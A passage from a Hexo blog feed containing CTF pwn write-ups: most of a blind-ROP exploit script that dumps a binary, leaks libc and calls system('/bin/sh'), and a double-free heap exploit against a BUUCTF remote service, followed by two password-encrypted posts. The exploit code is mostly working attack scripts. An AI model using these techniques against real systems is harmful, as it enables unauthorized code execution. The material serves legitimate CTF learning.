p64(func_plt_maybe+maybe_low_byte)</span><br><span class="line">            payload += p64(stop_gadget)</span><br><span class="line">            sh.send(payload)</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ELF&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(</span><br><span class="line">                    <span class="string">&quot;We found a function plt address is &quot;</span> + <span class="built_in">hex</span>(func_plt_maybe+maybe_low_byte)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span> (func_plt_maybe+maybe_low_byte)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump_file</span>(<span class="params">func_plt,padding_length,stop_gadget,brop_gadget</span>):</span></span><br><span class="line">    process_old_had_received_length=<span class="number">0</span></span><br><span class="line">    process_now_had_received_length=<span class="number">0</span></span><br><span class="line">    file_content=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">                payload  = <span class="string">&#x27;A&#x27;</span> * (padding_length - <span class="built_in">len</span>(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span>))</span><br><span class="line">                payload += <span class="string">&#x27;Begin_leak-----&gt;&#x27;</span></span><br><span class="line">                payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">                payload += p64(<span class="number">0x400000</span>+process_now_had_received_length)</span><br><span class="line">                payload += p64(func_plt)</span><br><span class="line">                payload += p64(stop_gadget)</span><br><span class="line">                sh.send(payload)</span><br><span class="line">                sh.recvuntil(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span> + p64(brop_gadget+<span class="number">9</span>).strip(<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">                received_data = sh.recvuntil(<span class="string">&#x27;x0AHello&#x27;</span>)[:-<span class="number">6</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(received_data) == <span class="number">0</span> :</span><br><span class="line">                    file_content += <span class="string">&#x27;x00&#x27;</span></span><br><span class="line">                    process_now_had_received_length += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span> :</span><br><span class="line">                    file_content += received_data</span><br><span class="line">                    process_now_had_received_length += <span class="built_in">len</span>(received_data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> process_now_had_received_length == process_old_had_received_length :</span><br><span class="line">                log.info(<span class="string">&#x27;We get &#x27;</span> + <span class="built_in">str</span>(process_old_had_received_length) +<span class="string">&#x27; byte file!&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;axb_2019_brop64_dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">                    fout.write(file_content)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            process_old_had_received_length = process_now_had_received_length</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding_length=<span class="number">216</span></span><br><span class="line"><span class="keyword">if</span> padding_length <span class="keyword">is</span> null:</span><br><span class="line">    padding_length=Force_find_padding()</span><br><span class="line"></span><br><span class="line">old_return_addr=<span class="number">0x400834</span></span><br><span class="line"><span class="keyword">if</span> old_return_addr <span class="keyword">is</span> null:</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">    old_return_addr=u64(sh.recvuntil(<span class="string">&#x27;Goodbye!&#x27;</span>).strip(<span class="string">&#x27;Goodbye!&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;The old return address is &#x27;</span>+ <span class="built_in">hex</span>(old_return_addr))</span><br><span class="line"></span><br><span class="line">stop_gadget=<span class="number">0x4007D6</span></span><br><span class="line"><span class="keyword">if</span> stop_gadget <span class="keyword">is</span> null:</span><br><span class="line">    stop_gadget=Find_stop_gadget(old_return_addr &amp; <span class="number">0xFFF000</span>,padding_length)</span><br><span class="line"></span><br><span class="line">brop_gadget=<span class="number">0x40095A</span></span><br><span class="line"><span class="keyword">if</span> brop_gadget <span class="keyword">is</span> null:</span><br><span class="line">    brop_gadget=Find_brop_gadget(old_return_addr &amp; <span class="number">0xFFF000</span>,padding_length,stop_gadget)</span><br><span class="line"></span><br><span class="line">func_plt=<span class="number">0x400635</span></span><br><span class="line"><span class="keyword">if</span> func_plt <span class="keyword">is</span> null:</span><br><span class="line">    func_plt=Find_func_plt(old_return_addr &amp; <span class="number">0xFFF000</span>,padding_length,stop_gadget,brop_gadget)</span><br><span class="line"></span><br><span class="line">is_dumped=<span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> is_dumped <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">True</span>:</span><br><span class="line">    Dump_file(func_plt,padding_length,stop_gadget,brop_gadget)</span><br><span class="line">    is_dumped=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">sh = get_sh()</span><br><span class="line">puts_got_addr=<span class="number">0x601018</span></span><br><span class="line">puts_plt_addr=<span class="number">0x400640</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * (padding_length - <span class="built_in">len</span>(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span>))</span><br><span class="line">payload += <span class="string">&#x27;Begin_leak-----&gt;&#x27;</span></span><br><span class="line">payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">payload += p64(puts_got_addr)</span><br><span class="line">payload += p64(puts_plt_addr)</span><br><span class="line">payload += p64(stop_gadget)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span> + p64(brop_gadget+<span class="number">9</span>).strip(<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">&#x27;x0AHello&#x27;</span>)[:-<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * padding_length</span><br><span class="line">payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(stop_gadget)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><h1 id="0x55-gyctf-2020-some-thing-exceting"><a href="#0x55-gyctf-2020-some-thing-exceting" class="headerlink" title="0x55.gyctf_2020_some_thing_exceting"></a>0x55.gyctf_2020_some_thing_exceting</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400896</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *fp; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  fp = fopen(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fp )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Emmmmmm!Maybe you want Fool me!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  byte_6020A0 = <span class="number">0x60</span>;</span><br><span class="line">  fgets(s, <span class="number">0x2D</span>, fp);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨sçš„åœ°æ–¹å†™äº†flagï¼š</p><p><img src="/2021/12/08/BUU-PWN-0x50-0x5F/image-20211209163407055.png" alt="image-20211209163407055"></p><p>double free ï¼Œå°†flagçš„åœ°å€å†™åˆ°ç¬¬ä¸€ä¸ªfreeçš„fdæŒ‡é’ˆï¼Œä¹‹åshowçš„æ—¶å€™å°±ä¼šå°†flagæ‰“å°å‡ºæ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25003</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./gyctf_2020_some_thing_exceting&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./gyctf_2020_some_thing_exceting&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size_1,size_2,content_1=<span class="string">&#x27;1&#x27;</span>,content_2=<span class="string">&#x27;1&#x27;</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;to do :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;ba&#x27;s length : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size_1))</span><br><span class="line">p.recvuntil(<span class="string">&quot;ba : &quot;</span>)</span><br><span class="line">p.send(content_1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;na&#x27;s length : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size_2))</span><br><span class="line">p.recvuntil(<span class="string">&quot;na : &quot;</span>)</span><br><span class="line">p.send(content_2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;to do :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;project ID : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;to do :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Banana ID : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">backdoor = <span class="number">0x6020a0</span></span><br><span class="line">payload = p64(backdoor-<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0x50</span>, payload,payload)<span class="comment">#2</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0x50</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0x30</span>)<span class="comment">#4</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;0x50-mrctf2020-shellcode-revengeï¼ˆå¯è§å­—ç¬¦shellcodeï¼‰&quot;&gt;&lt;a href=&quot;#0x50-mrctf2020-shellcode-revengeï¼ˆå¯è§å­—ç¬¦shellcodeï¼‰&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ç¼–è¯‘åŸç†Note</title>
    <link href="http://example.com/2021/12/01/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    <id>http://example.com/2021/12/01/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/</id>
    <published>2021-11-30T16:00:00.000Z</published>
    <updated>2021-12-02T07:24:24.113Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰ï¼Œè¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹ï¼Œè¯·å†è¯•è¯•ã€‚" data-whm="æŠ±æ­‰ï¼Œè¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«çº æ­£ï¼Œä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹ã€‚">  <script id="hbeData" type="hbeData" data-hmacdigest="d65326aeb8d81917eb344b1f6c08bb2d1eb0350b4a4bcb62c86fbbdee15bd242">994f9c06d970fb4aead1c76eb2a7916ef4db5aadaf7c5969188681a8504f5f2a2de4a2ba0dd1c0880e04d95b51d64a79647d8fa86b8944be21b4376a3b53b73df4ecb0457163144b9562c912c026d40bde9d779a2f0a4af0714b4a41185fb92a91b411e0c7e7844cfa86f8eb942e1d543325bd8f8d5c1275554f6824e4675dc712dffca79a4fb2017632b9d24f2c26b321855e8c15c923e4cf1036be7a8e0b54fc1b93ff9b023fff6964a5d87833363f0ea65d9e0e1cc02e543d4f68823a0cb7d9a3748efdeba9be2369de526f4430fdfae291ba48c3658e8b7d5c4d561d673510d0aaf09809e3a2ff8d3bcb0d4c98983a8ee0a8eeef9051fe81770a1417b2c94c044a2d8d6a34953cc60bb99f5562a2e60f4d31a1182191609da64a46151fe5a865a9212dc0f42b1513d443c87077b59c0aed963a777eafa157885c2fc6ab6b648e63ad0d3a5e354dd1c9f1ac9eb4f8d08408c83ac92b7e3ed7f965eeb1fb63fcaf26ed9dc56cdb28e4b4957efa9f58703c5175ff11a422a8afa1a2d772fe38e90c4deb4ee33a58de24a7c676c897ed9388f922c14788f12362b2010393d29c4b80b8c5954b2f63450432b2d91638e0f7e1bdfa43d24ada2602afa825ecffcf9f22673d26418f5db438f108a1dab8d6fcf22d909e5bcbad31e3c6cb4fca1e61d179f9e9d21e9693f8c18cbe26162c16b80e401bfae3b19cd29addd296af6c1ab1af7c6d9e83f4091f17f1a394c51a206766e18a0d94f338dfb0aed1921f7396c20158970bc150c972eb47b1641fd0c3971ef916fe527e3ca2f02a8feb9be4037d4a16ce2053241bd0c46dc39a64918fe8e697afe02a05f71a5434fc83fdaa434647e101a3253ef7b29cb2f593e0ef442fd6845dec8ed7a61d15d78c1ac5aa245e6486566cfda0e519a3bd58f0b7f67c7d9eeb2f35f72a4249ee2034155d77f531a0582ab839767dfc57c50e1b031939ecff5e1c9037fed49fb1d9d1965110bd18f441a7a051bc84796ed366b301d34e55f9b54f699fab7be6b23a3eb859249fa1c67cbc8de5ede313de879f14a1e9d4d301651ca859dd7c2f8df327252ed8fb8403bdd114699b168214ccb4413be79c718d5a48d15ec8d9ffa35f15d0710ab935f63aa63e182f8ad4af77bcc3781c8247c4fde304ddb013ec7d1dacffadb1df4022503ef6490beb159833731af98267bee3b21d3e0aee928e1666979aecbbc0fdf85d704e69cc09a6dd7919f8cefc09be9d6b06d1ebb8d73576127f477ead9f2b935163f647db720c8bdd70e38195968c7162392434db53f1708964c0efb55e83e0c547ce25e031be31a3e9eea7ffdbd294a15323827877e08a3f6592ccc1af3603e02cbcc2975411d0a71b984ddcc30b61bf0203c9b3f8a52d5cf3d77a099618a3cd5e002721661c9807ab2f3cffc970d322ca143aa44c19ca7a2ca86485c8f9fd31beca6876c6e7c68110fa6e8b678fc066909a3f3097985ff8ac93dce3f79237c9b724ccec129240919bdcce0deb1b569264d14f4cb9e5201d2276d3ee77768622f8aabfab83eb8a165aebbb9b374889578307789696b0a73f98eeeb68452ff616b253be0208fdc5ee75a8841a3f4a9667da8a8eadecaa43aded5ee3feaf0483b9fa39ac33422842303ebea6cfe468b58f6cc0baf0f89a7165da7588b00ee4e49bc3aa24f8e5430aaf80425891c8a8b97bb48b5449b3eae7de3b80dffc687336b962237c98026044d6fd4d79f9571b63408fe555d374a9ead76838008e8d8b1204a9a8832f7023249d589dbc098aba499fd93e5e6b26b4d0fe0a79d1e613091f68e250ecb57c4d46814308057346c471292bc4477728f4ec7033e92c920e017e2f60069fcbea402e14e81f5c224331fdf8f72338c0edfd284d03a2aab45249117e93ffd723d4b423871ff191a010027c0692020bd49cbd46a9958888c317fd697b29e2348fa579b6512a67a3336f201ecb4bb27aac1dbf153c875d37702c400788a7604f1a4b5caf3f74e6c1eb374c7197e921a32f98807780322ffe8c5c60a680c9ba123112e7f7f793fc05c6ccdc74e9d40f2e44db9c09156165a04dee9fe02d921cb2b490d574e1d412c240e94c2a0d0ad8b19652ae17a9964d985d6615e2af8e0457ff17647b93e14e06c7510a358934eb1f5458b1c1aed1a1b6c369f56e25c6352c898d450ec9c3187c9e18c2aed64a49c48bbcfa5397afe0a86c4b36c63ea465d03793023a23e5f08872ddb5c730aea21de746f9f607367e618f4a2a0c3236429325b34e0ca2ed47c909f9fc6d075d58dc8e2232cf31e9462744099068effd2e60b23462c29a54adcfa1f72498ce38d472608cad3346fb0040e3442e84667cfa0b47eebfc650c624171bd264a37c77dcee43e3d106be33b3d37724b76283dfcefd8d4e9e863ec3f31741f2de186272969175d547d99545a9d026086b2c2a29e5ef3a7e9cfcddc94d4624243c66eaaf41e83405f15482a5c14b3e9ef8c7eb2171ea9758ae2949f36b08278c92d346cdaa40943878d8fb036b27f58d1701de048617585ae440b32a8d1928ef302ba7bf5167d19abdda0213560b2409adce307656991745cbe8df0dd86f919603e097883316145788e1c25b79617c56209d9cfa7a1bae53eeb277663330d0c52d05e99a7491bd9d77a76d64fb79f6909a78a8a30b4718d37d3afa5fad184e4ca755de4dfe176b1e0542703fc15dfa101e65ff16fbc64ed9067fe0b8141f0d89c4932469da2751db22fabbe6d3cc01f4295f0b29514fc2c52718c23aab2a41869b3f21fbab12fc627242254cd1c04c62310f7e6ca71ec829c36e07c62f3a814789688f02d3c030e8f604f7cf6499644823efaf8b9097220d91e6d47ad5354d7b4338bd1fa88f46e3b4948de09143b72563f12bd15e76998dc617bae298e15113c485cdd6f6a762f2100ccc5993641ac9dcb05dd10821aa13331d54138fa3682e9d8a5cd8fdc3504fbf4e700fd834253e87b6675fb551bc1c3cd7717e261b1b5641b38048eb9a78dc979433c25e6cd4213acaff79ee6d8e4c0b249c04d5f3f80ef8bbcc79edf4aa56fd2c1705b437c85bdbb5b14c1e19c843336d106b720945a29a3c1a174ba15705120a5bd3fda70667306cadcf7a548c279181e1aed6a6c6c39f12d0b7b3fce794ceeca7e0e68d8cc94ea4c23b1b7e58005f68de08cbf334e347d834223995dc82943a42121c827d67cef7e347587cd9ef40e63e5821c03c75a44d8b337ebe9c8f043f233e5943687db64dad1505d014705ee07c5367fe15a8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">æ‚¨å¥½ï¼Œè¿™é‡Œéœ€è¦å¯†ç ã€‚</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">è¿™é‡Œæœ‰ä¸œè¥¿è¢«åŠ å¯†äº†ï¼Œéœ€è¦è¾“å…¥å¯†ç æŸ¥çœ‹å“¦ã€‚</summary>
    
    
    
    
    <category term="OS" scheme="http://example.com/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.S081+XV6 Note</title>
    <link href="http://example.com/2021/11/27/6.s081/"/>
    <id>http://example.com/2021/11/27/6.s081/</id>
    <published>2021-11-26T16:00:00.000Z</published>
    <updated>2021-12-01T15:10:01.325Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰ï¼Œè¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹ï¼Œè¯·å†è¯•è¯•ã€‚" data-whm="æŠ±æ­‰ï¼Œè¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«çº æ­£ï¼Œä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹ã€‚">  <script id="hbeData" type="hbeData" data-hmacdigest="c0eb6c3ee0f5a74a2c71a5cc038306f650a6eddeee8725260a4e01c8da4c1e1c">994f9c06d970fb4aead1c76eb2a7916ef4db5aadaf7c5969188681a8504f5f2ac72ac456c941275b05ed085b71406ef9674b826d8efe253ad2c8c8585b30d17cc88fc548a476e73b9a0363d382649cbabda798dbc924ad2b4862d7850cdd5f066c9e56747dea6ebb785fd4dc0374adf8b6453794896d734322809e434640ff1126a621c5c4a2d236455e289037454f7e312cee5762a482df8a870f6cd4297a1f75dad8dd25ab89fc65478cb633442fa2575dd8e2ba898638cab5b33045eb356dd61525064e432b53b04635fa7bc70f613918d263b413c3b3d8734cdb0ee7a265a9b6739e7999b6ce1b45c3235bbe4f9b5d4b33df51df62bc77d1cb5f8d7722b0b7338756080b040e912e2c486529e698f716a5a432deb2d4c71581401c24551549d02f9643c8884a41a292b44f6ae81d3b656efd7d20e6349acb28d4d3094d8d0e92e4f8a456236ed36dabc2dac312cf567cefd4e601e95b1749ecce55d22069725b92257e33e42d80ac4ce4238941f743de940f52634503423f2edbdacb5240b08c76d067bbcfb39869b6f663cf292d75d8cfb2ac73bcca9ff777b7433b1148666de75b15fd21cb6b3cbe5259551a044445c38440c2602cb4fbcbf3b800bd69a1c6131003aec487b269714fd1efc78d642bf0364e4d1e893d42f19a3773baa4032fb334599d8cbae7184bd302f31bc0b10ecc8e6516ff81e13125dd94bc922901bfe67ed60d05c28beed5fe37c2cdbfde0e1869b20c4f393c8ee4cacbb4bdf08462a76ef149d7fab4a52a6fc5bba0984c5c03c4cd1a7e29971c4016cbef5659effd736d7e1d1fb0a6546a714622b47f4dc330e6eedbf273c06c61576370207d643e3b07ac5a3668f8b6f280a759e6d0f8b676785c61581c0ed3f38fe0fd5956dc65d9c536ad4b1d12fb36c524607f71b063b7e760045cf5d98499667127caee5f82cd0ce2c8d0b6396b9af91f637f5133975f30a11a7a73ddc716cedf3cc7d8af6acae5c331b1a1594b7e9a6b0f87b2b7e77e129642f19d55fa5af771e2a530236f93bfa04a940f13bc0b3652bec23857a4d4c89303b98db0f511b52a5bbc5e457bbb887e2b4829a1ce47200426a7e0cd01e2d35c3153deea259d752e66edf88629fa29ad7ab176825c3e74dbb03ab9d2fa0c9ebcaf86386e3d608a63fbc5b178ddccb544aba079a101d6b526ab62c0e7625b90cd24e172a026063cf2347ede535bc72e7738281b89f9fb97d962b5d0a3343ac3e2e267f945d649591eae1bb9d59b32ad83a9d6e9a7243dc555f3e6332b416ab5286f7d60e208e98c1dc5b7733f6999f8ac0a4c6c48ced127cad0a86f81f384e060450bb5a3bec74234ced6711c1d7aed7d48232aa077d8a0b59f765a7f8e5846c28850638f85e1d889f8fb3491cffc89259f43b2f01dd49e961376e817278f2486c41e6d9255da46582ed2fce2aaed24881f34152f20013893f3fae048440e3ba0604d803a8f6b34b7a7b415ab5a8bd440357a17ddd859af68d8f7a218733b9f74b873dcb241db6caa9c0d4fd0c6e0658b64c9a9e2e3c3421c8659eb831f9e7af72dc09bf90c2763ccdb0c4fb00a9d91ea3e85f8802f7a5b53a59ba404132eb45b12fd4c3e12853dcb13ae27df68b714e17ca60be7be8983ac888f343a81e8e135ca8b0c8bcbc1fada51c3d3cd5c7fdd210b685e5b0361521d0908204a58f6edea4441ca2d8592f88a0a5278f954303cf96c765c8670a9adb3f17c50f7ef3b41a51e389bdb13dfc6e9eea5201390d2f2b0027989d20b082fc17eed157fcb0d2d2bcc1f68b4d9ca386a3f803121e03fb32250f1a711055aa2ddec92aba792ae007846e8344f7978afbc77dac573edb7b6dfece2bf8b471363a6372fb4fef7a135c3f06189c2e87fe0dec39bdac9c82801e88a3b64dccfcb0e425d5977036dfeb483384f79a0a200f164ef50a8a231c541ebc788b69d9f0231c3b12425794ac48eacb617b082a05a9afa73c5fb85bdfecf806f787ebbe496b76df184522d50b83b55ad3bcca0f8aacb697d2e1451996b78704383fa49f2e0321ac63de3fff800759a1333f9ab0cec22e3840340780b687c40fc456aa6f2c5095407802dcae4dd7654b80eb2d09c65a63144e2c65d5bcf1f8a52deb11c4292785582dcd3dd61b969c962f3461b302de27ccb73ca7aad98f01edcd94435459c11b76378159160f3a7c6cd91598e8563dd73b77184dbf33084f5502beb16fb991a91ed40afc26847b5db6c0db2b75c03a1ec890247815a1647950649b135f64e4e26d417d34f7697c9fc0db171e58084521f0bd2941db3f6f958a9f55ee11f13216e033454717a672e91718e5ddc8ebff999c83f5bc6ed227c9ff5254d630dd1709a63fe43cc062f11ff98046d60a456553234e710550f32f2fa43a0baff6ada8c2f33d1a752872005ef959db240ddcdca6aab1ccbe816e17649ecdcc747a3e762b874103b28370df5c9614ba99d411e02d4febc52a732b4abe7cdd0befad66177488df58071bdd669538b3c4b119c87d8242d3c1a0aa61e2227705130ed9b1f35ea1be391afa5f88326fd99e9a7b71efa80d90eee5240e93c2b12637bc212d6270c81226d05265625fcfb33c4417a95fe1026575f9d3e9884069a5973453a8a975c85358fbf3414f04bfc2487b62b5f9d03819d6b44d48caff698c6ea5c0cbe9724f512dbfbd31a7d1b5e54f26ea871d1d0e25f52de4e06fa31a43f642d4f5942135fc3699686a06bd3ba984d681c71662585db427584d15c13d70eaadca176213660a297b39e15a053799dee4be9146dfa127b293d4c3d2886e9a04d60ac283b7f70d435ba5dfc2e573adc807420